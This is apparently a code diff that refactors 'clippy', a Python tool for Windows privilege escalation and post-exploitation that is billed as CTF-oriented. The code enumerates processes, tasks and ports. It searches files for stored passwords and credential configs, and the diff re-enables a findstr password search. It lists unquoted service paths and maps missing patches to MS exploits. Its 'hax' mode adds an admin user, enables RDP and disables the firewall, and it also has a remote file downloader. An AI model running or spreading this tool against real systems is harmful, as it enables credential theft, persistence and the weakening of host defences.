@@ -4,41 +4,31 @@ from pathlib import Path
 report = ""
 
 def print_banner(title):
-	banner = "==============================\n" + title + "\n==============================\n"
-	global report
-	report += banner
-	print(banner)
+	print_append_to_report("==============================\n" + title + "\n==============================\n")
 
 def system_call(command):
-	process = subprocess.Popen(command,stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
-	(stdout, stderr) = process.communicate()
-	stdout = stdout.decode("utf-8",'ignore')
-	print(stdout)
-	global report
-	report += "\n" + stdout
-	return stdout
+	return print_append_to_report(subprocess.Popen(command,stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True).communicate()[0].decode("utf-8",'ignore'))
 
 def list_dir(path):
 	dir_string = ""
 	if path.exists():
-		for currentFile in path.iterdir():  
-			dir_string += str(currentFile) + "\n"
-	print(dir_string)
+		for currentFile in path.iterdir():  dir_string += str(currentFile) + "\n"
+	print_append_to_report(dir_string)
+
+def print_append_to_report(append):
+	print(append)
 	global report
-	report += "\n" + dir_string
+	report += "\n" + append
+	return append
 
 def determine_os_ver(ver_string): #stop coding on 2 hours sleep
-	final_ver = ""
-	sp = ""
+	sp = final_ver = ""
 	groups =  re.search("/\w+$/|2000|XP|Vista|7|8\.1|8|10|Server 2003|Server 2008|Server 2012|Server 2016",ver_string.splitlines()[0]) # catch os version
-	if groups:
-		final_ver = groups.group(0)
-	groups = ""
+	if groups: final_ver = groups.group(0)
+
 	groups = re.search('(?:^|\W)Service Pack [0-4](?:$|\W)',ver_string.splitlines()[1]) # catch sp ver
-	if groups:
-		sp = " SP" + str(int("".join(filter(str.isdigit,groups.group(0)))))
-	print("Detected OS Version: " + final_ver + sp + "Warning: buggy!")
-	return(final_ver + sp)
+	if groups: sp = " SP" + str(int("".join(filter(str.isdigit,groups.group(0)))))
+	return print_append_to_report(final_ver + sp)
 
 def kb_search(kbs,ver_string):
 	print_banner("OS/SP/KB Versions Possible Exploits")
@@ -73,24 +63,18 @@ def kb_search(kbs,ver_string):
 		#["MS14-058",[],"KB3000061"], #["MS15-010",["XP","2003","2008","7"],"KB3036220"],#["MS15-061",["2003","2008","7","2012","8"],"KB3057839"],#["MS15-075",["2003","2008","7","2012","8"],"KB3164038"],## ["MS16-051",["2003","2008","7","8","2012"],"KB3057191"],
 	compat = []
 	for vuln in vulns:
-		if os in vuln[1] and vuln[2] not in kbs:
-			compat.append(vuln)
+		if os in vuln[1] and vuln[2] not in kbs: compat.append(vuln)
 	if compat:
-		print("Possible exploits found for OS/SP/KB combination:")
-		for vuln in compat:
-			print(vuln[0])
+		print_append_to_report("Possible exploits found for OS/SP/KB combination:")
+		for vuln in compat: print_append_to_report(vuln[0])
 	else:
-		print("No exploits found for OS/SP/KB combination\n")
-
+		print_append_to_report("No exploits found for OS/SP/KB combination\n")
 
 def save_report():
-	text_file = open("clippy_report_" + str(datetime.datetime.now()).replace(":","_").replace(" ","_").replace(".","_") + ".txt", "w")
-	text_file.write(report)
-	text_file.close()
+	open("clippy_report_" + str(datetime.datetime.now()).replace(":","_").replace(" ","_").replace(".","_") + ".txt", "w").write(report)
 
 def greeting():
 	greetings = ["escalate privileges","hack the planet","hack UNATCO","hack the Gibson","create a GUI interface in Visual Basic to see if you can track an IP address"]
-	greeting = "I see you're trying to " + random.choice(greetings) + ", would you like some help with that?"
 	print("""\
 	< {0} >
 		     __
@@ -102,10 +86,7 @@ def greeting():
 		    || ||
 		    |\_/|
 		    \___/
-	                    """.format(greeting)) #Source https://textart.io/cowsay/clippy
-
-def usage():
-	print("Usage: clippy.exe\nclippy.exe enum            - Performs  enumeration\nclippy.exe enum report     - Performs enumeration and saves report to disk\nclippy.exe download [url]  - Downloads a file from given URL \nclippy.exe hax             - Creates new admin, enables RDP, disables firewall (CTF Orientated)")
+	                    """.format("I see you're trying to " + random.choice(greetings) + ", would you like some help with that?")) #Source https://textart.io/cowsay/clippy
 
 def enum():
 	print_banner("BASIC OS INFO")
@@ -139,7 +120,6 @@ def enum():
 	system_call('tasklist /v')
 
 	print_banner("SCHEDULED TASKS")
-
 	system_call('schtasks /query /fo LIST /v')
 
 	print_banner("NETWORKING: Listening Ports")
@@ -156,7 +136,7 @@ def enum():
 
 	print_banner("FILESYSTEM: Credentials Search")
 	system_call("dir /s *pass* == *cred* == *vnc* == *.config*")
-	# system_call("findstr /si password *.xml *.ini *.txt *.config")
+	system_call("findstr /si password *.xml *.ini *.txt *.config")
 	system_call("dir /b /s unattend.xml")
 	system_call("dir /b /s web.config")
 	system_call("dir /b /s sysprep.inf")
@@ -172,21 +152,16 @@ def enum():
 	list_dir(Path(os.getenv('LOCALAPPDATA')))
 
 	print_banner("WMIC: Installed Patches")
-	kb_search(re.findall (r'\b[KB]\w+', system_call("wmic qfe get Caption,Description,HotFixID,InstalledOn")),ver_string)
+	kb_search(re.findall(r'\b[KB]\w+', system_call("wmic qfe get Caption,Description,HotFixID,InstalledOn")),ver_string)
 
 	print_banner("WMIC: Unquoted Service Paths")
 	system_call('wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """"')
 
-	print_banner("ACCESSCHK")
-	if Path("accesschk.exe").exists():
-		system_call('accesschk.exe -uwcqv "Authenticated Users" * /accepteula')
-	else:
-		print("accesschk.exe missing.")
+	print_banner("ACCESSCHK: Service Permissions")
+	system_call('accesschk.exe -uwcqv "Authenticated Users" * /accepteula') if Path("accesschk.exe").exists() else print("accesschk.exe missing.")
 
 def download(url):
-	file = urllib.request.urlopen(url)
-	with open(url[url.rindex('/')+1:],'wb') as output:
-  		output.write(file.read())
+	with open(url[url.rindex('/')+1:],'wb') as output: output.write(urllib.request.urlopen(url).read())
 
 def obvious_hax():
 	print_banner("Creating a new admin user")
@@ -202,16 +177,12 @@ def obvious_hax():
 	system_call('netsh firewall set opmode disable')
 
 greeting()
-if len(sys.argv) > 1:
-	if "enum" in sys.argv:
-		enum()
-		if "report" in sys.argv:
-			save_report()
-	elif "hax" in sys.argv:
-		obvious_hax()
-	elif "download" in sys.argv and len(sys.argv) > 2:
-		download(sys.argv[2])
-	else: 
-		usage()
+if "enum" in sys.argv:
+	enum()
+	if "report" in sys.argv: save_report()
+elif "hax" in sys.argv: 
+	obvious_hax()
+elif "download" in sys.argv and len(sys.argv) > 2: 
+	download(sys.argv[2])
 else:
-		usage()
+	print("Usage: clippy.exe\nclippy.exe enum            - Performs  enumeration\nclippy.exe enum report     - Performs enumeration and saves report to disk\nclippy.exe download [url]  - Downloads a file from given URL \nclippy.exe hax             - Creates new admin, enables RDP, disables firewall (CTF Orientated)")
